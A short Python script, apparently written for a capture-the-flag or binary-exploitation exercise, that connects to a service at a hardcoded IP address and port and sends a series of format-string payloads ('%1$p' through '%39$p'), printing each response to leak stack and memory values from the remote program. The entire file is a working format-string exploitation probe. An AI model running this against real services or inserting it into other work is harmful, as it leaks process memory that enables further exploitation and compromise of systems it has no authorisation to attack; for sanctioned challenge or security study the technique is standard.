import socket

HOST = "45.33.118.86"
PORT = 9992

def query(fmt):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)  # Lire prompt initial
        s.sendall(fmt.encode() + b"\n")
        response = s.recv(4096).decode()
    return response

for i in range(1, 40):
    fmt = " ".join(["%{}$p".format(i)])
    print(f"Trying format string {fmt}")
    resp = query(fmt)
    print(resp)
